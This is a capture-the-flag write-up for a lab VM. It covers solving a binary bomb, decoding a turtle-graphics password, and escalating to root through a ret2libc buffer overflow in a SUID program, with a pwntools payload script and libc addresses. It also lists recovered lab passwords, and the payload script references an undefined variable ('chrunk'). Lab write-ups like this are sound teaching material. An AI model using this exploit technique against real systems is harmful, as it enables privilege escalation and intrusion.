Same steps as the previous one for the foothold

Use linpeas to find other exploits
![[Images/Capture d’écran 2024-07-25 à 14.59.09.png]]
![[Images/Capture d’écran 2024-07-25 à 14.59.28.png]]

Let's try to log with that password (`G!@M6f4Eatau{sF"`)
![[Images/Capture d’écran 2024-07-25 à 15.00.10.png]]

## lmezard
![[Images/Capture d’écran 2024-07-25 à 15.01.04.png]]

When we `cat fun`, we get lines like:
`//file701ft_fun/TKH5A.pcap0000640000175000001440000000005412563172202012522 0ustar  nnmusers	printf("Hahahaha Got you!!!\n");`
which means it's a tar archive.

Let's decompress it:
`cp fun /tmp`
`cd /tmp`
`tar -xvf fun`

It creates the directory ft_fun that contains a lot of pcap files
![[Images/Capture d’écran 2024-07-25 à 15.05.08.png]]

Each of these files are in the format of
```
[C code]

//file[A number from 1 to 750]
```

So let's create a script that will get the number and print the code in a C file in the right order:
```python
#! /usr/bin/env python3
import os
import re
import sys

results = {}

for file in os.listdir("ft_fun"):
    f = open("ft_fun/%s" % file, 'r')
    content = f.read()
    f.close()
    file_line = re.search(r'//file([0-9]*)', content)
    file_number = int(file_line.group(1))
    results[file_number] = content

original_stdout = sys.stdout
with open("main.c", 'w+') as file:
    sys.stdout = file
    for _, value in sorted(results.items()):
        print(value)
    file.close()
```

We can now compile and execute the file created :
![[Images/Capture d’écran 2024-07-25 à 16.20.04.png]]

We have to use the SHA-256 of Iheartpwnage :
`echo -n 'Iheartpwnage' | sha256sum` and we get 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

We can now `su laurie` with this and it works
![[Images/Capture d’écran 2024-07-25 à 16.21.49.png]]
## laurie
![[Images/Capture d’écran 2024-07-26 à 15.52.55.png]]

Let's use ghidra to decompile the bomb program
```c
int main(int argc,char **argv)

{
  undefined4 uVar1;
  int in_stack_00000004;
  undefined4 *in_stack_00000008;
  
  if (in_stack_00000004 == 1) {
    infile = stdin;
  }
  else {
    if (in_stack_00000004 != 2) {
      printf("Usage: %s [<input_file>]\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
      exit(8);
    }
    infile = (_IO_FILE *)fopen((char *)in_stack_00000008[1],"r");
    if ((FILE *)infile == (FILE *)0x0) {
      printf("%s: Error: Couldn\'t open %s\n",*in_stack_00000008,in_stack_00000008[1]);
                    /* WARNING: Subroutine does not return */
      exit(8);
    }
  }
  initialize_bomb(argv);
  printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
  printf("only one life good luck !! Have a nice day!\n");
  uVar1 = read_line();
  phase_1(uVar1);
  phase_defused();
  printf("Phase 1 defused. How about the next one?\n");
  uVar1 = read_line();
  phase_2(uVar1);
  phase_defused();
  printf("That\'s number 2.  Keep going!\n");
  uVar1 = read_line();
  phase_3(uVar1);
  phase_defused();
  printf("Halfway there!\n");
  uVar1 = read_line();
  phase_4(uVar1);
  phase_defused();
  printf("So you got that one.  Try this one.\n");
  uVar1 = read_line();
  phase_5(uVar1);
  phase_defused();
  printf("Good work!  On to the next...\n");
  uVar1 = read_line();
  phase_6(uVar1);
  phase_defused();
  return 0;
}
```
> It first checks if we gave it an argument. In that case it will open the file given, otherwise it will read from the stdin. After that it reads a line and then calls the current phase.

### Phase 1
```c
void phase_1(undefined4 param_1)
{
  int iVar1;
  
  iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```
> We see that all the phase 1 does is check if we gave it "Public speaking is very easy."

The answer for this phase is therefore `Public speaking is very easy.`
### Phase 2
```c
void phase_2(undefined4 param_1)
{
  int iVar1;
  int aiStack_20 [7];
  
  read_six_numbers(param_1,aiStack_20 + 1);
  if (aiStack_20[1] != 1) {
    explode_bomb();
  }
  iVar1 = 1;
  do {
    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
      explode_bomb();
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  return;
}

```
> It reads the six numbers we gave it as an input (separated by spaces and beginning at index 1, we can see that in the `read_six_numbers` function). Then, it checks that the first number is 1 and that the next ones are equal to `index * previous_number`.

By calculating each value we find the correct numbers to be 1, 2, 6, 24, 120 and 720. Hence, the answer is `1 2 6 24 120 720`.
### Phase 3
```c
void phase_3(char *param_1)
{
  int iVar1;
  char cVar2;
  undefined4 local_10;
  char local_9;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    cVar2 = 'q';
    if (local_8 != 0x309) {
      explode_bomb();
    }
    break;
  case 1:
    cVar2 = 'b';
    if (local_8 != 0xd6) {
      explode_bomb();
    }
    break;
  case 2:
    cVar2 = 'b';
    if (local_8 != 0x2f3) {
      explode_bomb();
    }
    break;
  case 3:
    cVar2 = 'k';
    if (local_8 != 0xfb) {
      explode_bomb();
    }
    break;
  case 4:
    cVar2 = 'o';
    if (local_8 != 0xa0) {
      explode_bomb();
    }
    break;
  case 5:
    cVar2 = 't';
    if (local_8 != 0x1ca) {
      explode_bomb();
    }
    break;
  case 6:
    cVar2 = 'v';
    if (local_8 != 0x30c) {
      explode_bomb();
    }
    break;
  case 7:
    cVar2 = 'b';
    if (local_8 != 0x20c) {
      explode_bomb();
    }
    break;
  default:
    cVar2 = 'x';
    explode_bomb();
  }
  if (cVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```
> This function a number, a character and another number, separated by spaces. It then checks the second number based on the first one and assigns a character. At the end, it checks that the character we gave it is the same as the one it assigned during the match.

To solve this, we just have to give it a value that will correspond to one match. Let's use the case one. The first number has to be 1, the character b and the second number 0xd6, which is 214 in decimal. The correct input is `1 b 214`
### Phase 4
```c
int func4(int param_1)
{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}

void phase_4(char *param_1)
{
  int iVar1;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) {
    explode_bomb();
  }
  return;
}

```
> `phase_4` gets a number from the input, pass it to `func4` and checks that the result is 0x37, or 55 in decimal. `func4` gives the param-th Fibonnaci number.

Given that $F(x)$ is Fibonnaci sequence, $x$ so that $F(x) = 55$ is 9. The answer is `9`
### Phase 5
```c
void phase_5(int param_1)
{
  int iVar1;
  undefined local_c [6];
  undefined local_6;
  
  iVar1 = string_length(param_1);
  if (iVar1 != 6) {
    explode_bomb();
  }
  iVar1 = 0;
  do {
    local_c[iVar1] = (&array.123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  local_6 = 0;
  iVar1 = strings_not_equal(local_c,"giants");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}

```
> `phase_5` begins by checking if the length of the input is 6. It then creates a new string by applying `& 0xf` (`0xf` is `00001111` in binary so masking it will keep only keep the 4 last bits of the given number) to each character of the input (their ascii code) and get the character at that index in `array.123`. Lastly, it checks if the created string is "giants".

With ghidra, we can see that array.123 is `['i', 's', 'r', 'v', 'e', 'a', 'w', 'h', 'o', 'b', 'p', 'n', 'u', 't', 'f', 'g']`. We can then know what index we have to get (15, 0, 5, ...) and we can find the characters whose ascii codes end with the correct numbers. We get `opekmq`.
### Phase 6
```c
void phase_6(undefined4 param_1)
{
  int *piVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  undefined1 *local_38;
  int *local_34 [6];
  int local_1c [6];
  
  local_38 = node1;
  read_six_numbers(param_1,local_1c);
  iVar4 = 0;
  do {
    iVar2 = iVar4;
    if (5 < local_1c[iVar4] - 1U) {
      explode_bomb();
    }
    while (iVar2 = iVar2 + 1, iVar2 < 6) {
      if (local_1c[iVar4] == local_1c[iVar2]) {
        explode_bomb();
      }
    }
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);
  iVar4 = 0;
  do {
    iVar2 = 1;
    piVar3 = (int *)local_38;
    if (1 < local_1c[iVar4]) {
      do {
        piVar3 = (int *)piVar3[2];
        iVar2 = iVar2 + 1;
      } while (iVar2 < local_1c[iVar4]);
    }
    local_34[iVar4] = piVar3;
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);
  iVar4 = 1;
  piVar3 = local_34[0];
  do {
    piVar1 = local_34[iVar4];
    piVar3[2] = (int)piVar1;
    iVar4 = iVar4 + 1;
    piVar3 = piVar1;
  } while (iVar4 < 6);
  piVar1[2] = 0;
  iVar4 = 0;
  do {
    if (*local_34[0] < *(int *)local_34[0][2]) {
      explode_bomb();
    }
    local_34[0] = (int *)local_34[0][2];
    iVar4 = iVar4 + 1;
  } while (iVar4 < 5);
  return;
}
```
> Gets six numbers from the input and checks that they are unique numbers ranging from 1 to 6. Then, creates a linked list by taking the nth element of an existing linked list where n is the current number of the input. Lastly, checks if the created linked list is sorted in descending order.

First we need to know the content of the existing linked list. Ghidra calls it node1, so le'ts check with gdb. We see that there are 6 nodes. We can print them with `x/1w`.
![[Images/Capture d’écran 2024-08-01 à 16.20.12.png]]
The linked list is `[253, 725, 301, 997, 212, 432]`. The correct order to make it descending is `4 2 6 3 1 5` ; that's the input to give the bomb.
![[Images/Capture d’écran 2024-08-01 à 16.26.33.png]]
### Solution

The file we can submit the bomb is hence
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5
```

The README tells us that the password is the combination of all that, without spaces. So `Publicspeakingisveryeasy.126241207201b2149opekmq426315` but it doesn't work. After searching Slack, someone mentioned a typo, so the answer is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
![[Images/Capture d’écran 2024-08-01 à 16.36.25.png]]

## thor

`ls`
![[Images/Capture d’écran 2024-08-01 à 22.43.47.png]]

`cat turtle` shows us a lot of instructions like `Tourne droite de 1 degrees` or `Avance 50 spaces` and ends by `Can you digest the message? :)`

Let's make a script to turn these lines into turtle (python graphic package) instructions
```python
#! /usr/bin/env python3

import re
import os
import time
import turtle

class CustomTurtle:
    def __init__(self, start_x, start_y, direction, offset):
        self.turtle = turtle.Turtle()
        self.x_position = start_x
        self.y_position = start_y
        self.initial_direction = direction
        self.offset = offset

    def execute_instruction(self, instruction, value):
        if instruction == 'right':
            self.turtle.right(value)
        elif instruction == 'left':
            self.turtle.left(value)
        elif instruction == 'forward':
            self.turtle.forward(value)
        elif instruction == 'backward':
            self.turtle.backward(value)

    def reset_position(self):
        self.turtle.penup()
        self.turtle.goto(self.x_position, self.y_position)
        self.turtle.setheading(self.initial_direction)
        self.turtle.pendown()
        self.x_position += self.offset

def parse_file(file_path):
    rx_dict = {
        'right': re.compile(r'^Tourne droite de (\d+) degrees'),
        'left': re.compile(r'^Tourne gauche de (\d+) degrees'),
        'forward': re.compile(r'^Avance (\d+) spaces'),
        'backward': re.compile(r'^Recule (\d+) spaces')
    }

    figures = []
    figure = []

    with open(file_path, 'r') as file:
        for line in file:
            if line == "\n":
                figures.append(figure.copy())
                figure.clear()
                continue
            for key, rx in rx_dict.items():
                match = rx.search(line)
                if match:
                    figure.append((key, int(match.group(1))))
                    break
    return figures

def main():
    file_path = os.path.dirname(os.path.abspath(__file__)) + '/turtle'
    figures = parse_file(file_path)
    custom_turtle = CustomTurtle(-300, 0, -270, 180)
    for fig in figures:
        custom_turtle.reset_position()
        for ins, value in fig:
            custom_turtle.execute_instruction(ins, value)
        time.sleep(1)
    turtle.done()

if __name__ == "__main__":
    main()
```
![[Images/Capture d’écran 2024-08-01 à 22.47.56.png]]

The message is 'SLASH', let's digest it (apply the Message-Digest Algorith, aka MD5) :
`echo -n SLASH > pass`
`openssl dgst pass`
`su zaz` with `646da671ca01bb5d84dbb5fb2238dc8e`
![[Images/Capture d’écran 2024-08-01 à 22.49.03.png]]

## zaz

![[Images/Capture d’écran 2024-08-02 à 11.59.58.png]]
> SUID bit

![[Images/Capture d’écran 2024-08-02 à 10.46.52.png]]

Let's decompile it with ghidra
```c
bool main(int param_1,int param_2)

{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}
```
> If at least one argument, copies the first argument into a 140 characters tmp string and prints it. Returns 1 if there is no argument, 0 otherwise.

### Ret2libc

The 140 character limit allows us to use a stack buffer overflow. In this case, we'll use a ret2libc overflow. It will allow us to execute a shell command by calling the system() function. For that we need three things : the address of system() to call it, the address of exit() to exit properly afterwards and the address of the string "/bin/sh", to give to system().

#### system() and exit()
To find the address of the functions, we can simply use gdb:
`gdb ./exploit_me test`
![[Images/Capture d’écran 2024-08-02 à 12.32.14.png]]
We find that the address of system is `0xb7e6b060` and the address of exit is `0xb7e5ebe0`

#### "/bin/sh"
To find the address of this string, we have to search it in the libc. First let's find the address of the libc in gdb with `info proc map`
![[Images/Capture d’écran 2024-08-02 à 12.33.52.png]]
The beginning address of `/lib/i386-linux-gnu/libc-2.15.so` is `0xb7e2c000`. We can now use `strings` with the options `-a` (searche the whole file) and `-t x` (give the offset of each function in hexadecimal) to find the offset of the string "/bin/sh":
`strings -a -t x /lib/i386-linux-gnu/libc-2.15.so | grep "/bin/sh"`
![[Images/Capture d’écran 2024-08-02 à 12.37.09.png]]
And we find the offset to be `0x160c58`. The "/bin/sh" is at `0xb7f8cc58` (`0xb7e2c000` + `0x160c58`). We can verify that with gdb:
![[Images/Capture d’écran 2024-08-02 à 12.39.14.png]]

#### Exploit
We now have all the addresses. The correct order to push them in is system, then exit, then argument. Let's create a little python script that will convert the addresses in little endian and write them to a file, that we will give to the SUID program afterwards.
```python
from pwn import *

overflow = b"A" * 140
system_plt = pack(0xb7e6b060)
exit_plt = pack(0xb7e5ebe0)
sh_plt = pack(0xb7f8cc58)

payload = chrunk + system_plt + exit_plt + sh_plt

f = open("exploit.txt", "wb")
f.write(payload)
f.close()
```
> Given that I use the pwn package to convert to little endian, I used this script in local and then upload the exploit.txt to the VM

Then, on the machine we can execute `./exploit_me $(cat exploit.txt)` and we gain access to a root shell :
![[Images/Capture d’écran 2024-08-02 à 12.45.21.png]]
